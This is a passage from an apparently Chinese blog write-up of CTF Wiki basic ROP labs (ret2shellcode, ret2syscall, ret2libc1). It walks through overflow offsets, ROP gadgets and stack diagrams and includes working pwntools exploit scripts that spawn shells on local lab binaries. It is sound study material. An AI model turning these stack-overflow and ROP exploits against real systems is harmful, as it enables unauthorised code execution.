main+7B↑o<br>.<span class="hljs-symbol">bss:</span>0804A080 <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span>+_bss ends<br>.<span class="hljs-symbol">bss:</span>0804A080 <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span>+<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821175740.png" alt="image.png"></p><h2 id="gdb分析"><a href="#gdb分析" class="headerlink" title="gdb分析"></a>gdb分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwndbg&gt; b main<br>...<br>pwndbg&gt; r<br>...<br><br>pwndbg&gt; vmmap<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>     Start        End Perm     Size Offset File<br> 0x8048000  0x8049000 r-xp     1000      0 /root/ctfwiki/ret2shellcode/ret2shellcode<br> 0x8049000  0x804a000 r--p     1000      0 /root/ctfwiki/ret2shellcode/ret2shellcode<br> 0x804a000  0x804b000 rw-p     1000   1000 /root/ctfwiki/ret2shellcode/ret2shellcode<br>0xf7c00000 0xf7c22000 r--p    22000      0 /usr/lib/i386-linux-gnu/libc.so.6<br>0xf7c22000 0xf7d9b000 r-xp   179000  22000 /usr/lib/i386-linux-gnu/libc.so.6<br>0xf7d9b000 0xf7e1c000 r--p    81000 19b000 /usr/lib/i386-linux-gnu/libc.so.6<br>0xf7e1c000 0xf7e1e000 r--p     2000 21b000 /usr/lib/i386-linux-gnu/libc.so.6<br>0xf7e1e000 0xf7e1f000 rw-p     1000 21d000 /usr/lib/i386-linux-gnu/libc.so.6<br>0xf7e1f000 0xf7e29000 rw-p     a000      0 [anon_f7e1f]<br>0xf7fc2000 0xf7fc4000 rw-p     2000      0 [anon_f7fc2]<br>0xf7fc4000 0xf7fc8000 r--p     4000      0 [vvar]<br>0xf7fc8000 0xf7fca000 r-xp     2000      0 [vdso]<br>0xf7fca000 0xf7fcb000 r--p     1000      0 /usr/lib/i386-linux-gnu/ld-linux.so.2<br>0xf7fcb000 0xf7fed000 r-xp    22000   1000 /usr/lib/i386-linux-gnu/ld-linux.so.2<br>0xf7fed000 0xf7ffb000 r--p     e000  23000 /usr/lib/i386-linux-gnu/ld-linux.so.2<br>0xf7ffb000 0xf7ffd000 r--p     2000  30000 /usr/lib/i386-linux-gnu/ld-linux.so.2<br>0xf7ffd000 0xf7ffe000 rw-p     1000  32000 /usr/lib/i386-linux-gnu/ld-linux.so.2<br>0xfffdd000 0xffffe000 rwxp    21000      0 [stack]<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821180512.png" alt="image.png"></p><p>答案中说，这个地方可以看出来bss段有可执行权限，怎么看出来的呢？？？？</p><p>20230830更新 开始<br>同组的小伙伴拿着exp执行不了结果，我就又回顾了以下这道题。我之所以能够执行，是因为我pwndbg是在kali的虚拟机中执行的，exp是在我ubuntu的虚拟机执行的，所以可以正常执行；当放到kali的系统中执行exp的时候，就执行不了了…<br>20230830更新 结束</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># gdb ret2shellcode</span><br>pwndbg&gt; b main<br>...<br>pwndbg&gt; run<br>...<br>pwndbg&gt; n<br>pwndbg&gt; n<br>pwndbg&gt; n<br>...<br>AAAAAAAA<br>pwndbg&gt; stack 40<br>pwndbg&gt; distance 源地址 目的地址<br>pwndbg&gt; p/d 0x6c<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821181055.png" alt="image.png"></p><p>查找偏移地址为108</p><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">默认栈帧<br>                                           +-----------------+<br>                                           |<span class="hljs-string">     retaddr     </span>|<br>                                           +-----------------+<br>                                           |<span class="hljs-string">     saved ebp   </span>|<br>                                    ebp---&gt;+-----------------+<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                    buf---&gt;+-----------------+<br><br>修改后栈帧<br>                                           +-----------------+<br>                                           |<span class="hljs-string">   (retaddr)     </span>|<br>                                           |<span class="hljs-string">    buf2_addr    </span>|<br>                                           +-----------------+<br>                                           |<span class="hljs-string">   (saved ebp)   </span>|<br>                                           |<span class="hljs-string">       BBBB      </span>|<br>                                    ebp---&gt;+-----------------+<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">shellcode...AAAA </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                      s---&gt;+-----------------+<br><br>                                           +-----------------+<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">shellcode...AAAA </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                   buf2---&gt;+-----------------+    bss段                                 <br></code></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2shellcode&#x27;</span>)<br>shellcode = asm(shellcraft.sh())<br>buf2_addr = <span class="hljs-number">0x804a080</span> <br><br>sh.sendline(shellcode.ljust(<span class="hljs-number">108</span>+<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;A&#x27;</span>) + p32(buf2_addr))<br>sh.interactive()<br><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">[root@ningan ret2shellcode]# python exp.py</span><br><span class="hljs-string">[+] Starting local process &#x27;./ret2shellcode&#x27;: pid 8742</span><br><span class="hljs-string">[*] Switching to interactive mode</span><br><span class="hljs-string">No system for you this time !!!</span><br><span class="hljs-string">bye bye ~$ ls</span><br><span class="hljs-string">exp.py    ret2shellcode</span><br><span class="hljs-string">$</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br></code></pre></td></tr></table></figure><h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><h2 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ret2syscall]<span class="hljs-comment"># checksec rop</span><br>[*] <span class="hljs-string">&#x27;/root/ctf/ctfwiki/ret2syscall/rop&#x27;</span><br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br><br>[root@ningan ret2syscall]<span class="hljs-comment"># file rop</span><br>rop: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, <span class="hljs-keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=2bff0285c2706a147e7b150493950de98f182b78, with debug_info, not stripped<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822161744.png" alt="image.png"></p><h2 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What do you plan to do?&quot;</span>);<br>  gets(&amp;v4);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821202247.png" alt="image.png"></p><p>可以看到这块有这么多函数，因为是静态链接进来的</p><h2 id="gdb分析-1"><a href="#gdb分析-1" class="headerlink" title="gdb分析"></a>gdb分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># gdb rop</span><br>pwndbg&gt; b main<br>...<br>pwndbg&gt; run<br>...<br>pwndbg&gt; n<br>pwndbg&gt; n<br>pwndbg&gt; n<br>...<br>AAAAAAAA<br>pwndbg&gt; stack 40<br>pwndbg&gt; distance 0xffffd2fc 0xffffd368<br>0xffffd2fc-&gt;0xffffd368 is 0x6c bytes (0x1b words)<br>pwndbg&gt; p/d 0x6c<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822160951.png" alt="image.png"></p><h2 id="ROPgadget分析"><a href="#ROPgadget分析" class="headerlink" title="ROPgadget分析"></a>ROPgadget分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ret2syscall]<span class="hljs-comment"># ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br>0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret<br>0x080bb196 : pop eax ; ret<br>0x0807217a : pop eax ; ret 0x80e<br>0x0804f704 : pop eax ; ret 3<br>0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret<br>[root@ningan ret2syscall]<span class="hljs-comment">#</span><br>[root@ningan ret2syscall]<span class="hljs-comment"># ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;</span><br>0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret<br>0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret<br>0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret<br>0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret<br>0x080be23f : pop ebx ; pop edi ; ret<br>0x0806eb69 : pop ebx ; pop edx ; ret<br>0x08092258 : pop ebx ; pop esi ; pop ebp ; ret<br>0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret<br>0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10<br>0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14<br>0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc<br>0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4<br>0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8<br>0x08048913 : pop ebx ; pop esi ; pop edi ; ret<br>0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4<br>0x08049a94 : pop ebx ; pop esi ; ret<br>0x080481c9 : pop ebx ; ret<br>0x080d7d3c : pop ebx ; ret 0x6f9<br>0x08099c87 : pop ebx ; ret 8<br>0x0806eb91 : pop ecx ; pop ebx ; ret<br>0x0806336b : pop edi ; pop esi ; pop ebx ; ret<br>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret<br>0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret<br>0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret<br>0x0805c820 : pop esi ; pop ebx ; ret<br>0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret<br>0x0807b6ed : pop ss ; pop ebx ; ret<br>[root@ningan ret2syscall]<span class="hljs-comment">#</span><br>[root@ningan ret2syscall]<span class="hljs-comment">#</span><br>[root@ningan ret2syscall]<span class="hljs-comment">#</span><br>[root@ningan ret2syscall]<span class="hljs-comment"># ROPgadget --binary rop  --string &#x27;/bin/sh&#x27;</span><br>Strings information<br>============================================================<br>0x080be408 : /bin/sh<br>[root@ningan ret2syscall]<span class="hljs-comment">#</span><br>[root@ningan ret2syscall]<span class="hljs-comment">#</span><br>[root@ningan ret2syscall]<span class="hljs-comment"># ROPgadget --binary rop  --only &#x27;int&#x27;</span><br>Gadgets information<br>============================================================<br>0x08049421 : int 0x80<br><br>Unique gadgets found: 1<br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821202913.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821202946.png" alt="image.png"></p><h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><p>此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。</p><p>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell</p><p><code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code></p><p>其中，该程序是 32 位，所以我们需要使得</p><ul><li>系统调用号，即 eax 应该为 0xb</li><li>第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。</li><li>第二个参数，即 ecx 应该为 0</li><li>第三个参数，即 edx 应该为 0</li></ul><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">默认栈帧<br>                                           +-----------------+<br>                                           |<span class="hljs-string">     retaddr     </span>|<br>                                           +-----------------+<br>                                           |<span class="hljs-string">     saved ebp   </span>|<br>                                    ebp---&gt;+-----------------+<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                     v4---&gt;+-----------------+<br><br>修改后栈帧<br>                                           +-----------------+<br>                                           |<span class="hljs-string">    0x80_addr    </span>|<br>                                           +-----------------+                                           <br>                                           |<span class="hljs-string">  /bin/sh_addr   </span>|<br>                                           +-----------------+                                           <br>                                           |<span class="hljs-string">        0        </span>|<br>                                           +-----------------+                                           <br>                                           |<span class="hljs-string">        0        </span>|<br>                                           +-----------------+                                           <br>                                           |<span class="hljs-string">pop_edx_ecx_ebx_ret_addr </span>|<br>                                           +-----------------+                                        <br>                                           |<span class="hljs-string">       0xb       </span>|<br>                                           +-----------------+<br>                                           |<span class="hljs-string">    (retaddr)    </span>|<br>                                           |<span class="hljs-string">pop_eax_ret_addr </span>|<br>                                           +-----------------+<br>                                           |<span class="hljs-string">   (saved ebp)   </span>|<br>                                           |<span class="hljs-string">       BBBBB     </span>|<br>                                    ebp---&gt;+-----------------+<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">   AAA...AAAA    </span>|<br>                                           |<span class="hljs-string">     108位       </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                     v4---&gt;+-----------------+<br></code></pre></td></tr></table></figure><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/usr/bin/env python</span><br>from pwn import *<br><br>sh = process(<span class="hljs-string">&#x27;./rop&#x27;</span>)<br><br>pop_eax_ret = 0x080bb196<br>pop_edx_ecx_ebx_ret = 0x0806eb90<br>int_0x80 = 0x08049421<br>binsh = 0x80be408<br><br>payload = flat([<span class="hljs-string">&#x27;A&#x27;</span> * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])<br><br>sh.sendline(payload)<br>sh.interactive()<br><br><br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">[root@ningan ret2syscall]# python exp.py</span><br><span class="hljs-string">[+] Starting local process &#x27;./rop&#x27;: pid 24853</span><br><span class="hljs-string">[*] Switching to interactive mode</span><br><span class="hljs-string">This time, no system() and NO SHELLCODE!!!</span><br><span class="hljs-string">What do you plan to do?</span><br><span class="hljs-string">$ ls</span><br><span class="hljs-string">exp.py    rop</span><br><span class="hljs-string">$</span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2shellcode">ctfwifi官方 ret2shellcode</a></p><h1 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h1><h2 id="检查-1"><a href="#检查-1" class="headerlink" title="检查"></a>检查</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ret2libc1]<span class="hljs-comment"># file ret2libc1</span><br>ret2libc1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=fb89c86b266de4ff294489da59959a62f7aa1e61, with debug_info, not stripped<br>[root@ningan ret2libc1]<span class="hljs-comment">#</span><br>[root@ningan ret2libc1]<span class="hljs-comment"># checksec ret2libc1</span><br>[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)<br>[*] <span class="hljs-string">&#x27;/root/ctf/ctfwiki/ret2libc1/ret2libc1&#x27;</span><br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br><br></code></pre></td></tr></table></figure><h2 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);<br>  gets(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>查找system函数的地址</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">.plt:<span class="hljs-number">08048460</span>                               ; <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">system</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *command)</span></span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822163544.png" alt="image.png"></p><p>查找&#x2F;bin&#x2F;sh字符串的地址</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.rodata:<span class="hljs-number">08048720</span><span class="hljs-number">00000008</span>C<span class="hljs-regexp">/bin/</span>sh<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822163657.png" alt="image.png"></p><h2 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h2><p>这个例子相对来说简单，同时提供了 system 地址与 &#x2F;bin&#x2F;sh 的地址</p><p>如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以’4位垃圾数据’ 作为虚假的地址，其后参数对应的参数内容。</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">默认栈帧<br>                                           +-----------------+<br>                                           |<span class="hljs-string">     retaddr     </span>|<br>                                           +-----------------+<br>                                           |<span class="hljs-string">     saved ebp   </span>|<br>                                    ebp---&gt;+-----------------+<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                     v4---&gt;+-----------------+<br><br>修改后栈帧<br><br>                                           +-----------------+                                           <br>                                           |<span class="hljs-string">    binsh_addr   </span>|<br>                                           +-----------------+                                        <br>                                           |<span class="hljs-string">    4位垃圾数据   </span>|<br>                                           +-----------------+<br>                                           |<span class="hljs-string">    (retaddr)    </span>|<br>                                           |<span class="hljs-string"> system_plt_addr </span>|<br>                                           +-----------------+<br>                                           |<span class="hljs-string">   (saved ebp)   </span>|<br>                                           |<span class="hljs-string">      BBBBB      </span>|<br>                                    ebp---&gt;+-----------------+<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">   AAA...AAAA    